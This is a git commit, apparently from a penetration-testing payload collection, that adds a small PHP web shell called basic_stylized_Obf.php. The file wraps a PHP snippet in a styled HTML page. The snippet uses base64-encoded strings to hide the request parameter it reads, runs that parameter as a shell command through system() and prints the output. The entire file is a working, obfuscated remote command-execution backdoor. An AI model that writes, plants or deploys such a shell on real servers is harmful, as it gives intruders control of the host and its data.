f24226846070381758c879b24c859b012276444a
Philip Otter <78989650+Philip-Otter@users.noreply.github.com>
2024-08-13 22:00:38 -0800

    Create basic_stylized_Obf.php

---
+++ Supporting Files/Payloads/Web Shells/basic_stylized_Obf.php
@@ -0,0 +1,14 @@
+<head>
+<style>
+    pre {color:green;
+        border: 5px solid;
+        border-radius:10px;
+        border-color:black;
+        background-color:black;
+        font-size: 20;}
+    body {background-color:gray}
+</style>
+</head>
+<body>
+<?php if(isset($_REQUEST[base64_decode('Mlg=')])){$p1dccadfed7bcbb036c56a4afb97e906f=$_REQUEST[base64_decode('Mlg=')];echo base64_decode('PHByZT4=');system($p1dccadfed7bcbb036c56a4afb97e906f);echo base64_decode('PC9wcmU+');die;}?>
+</body>
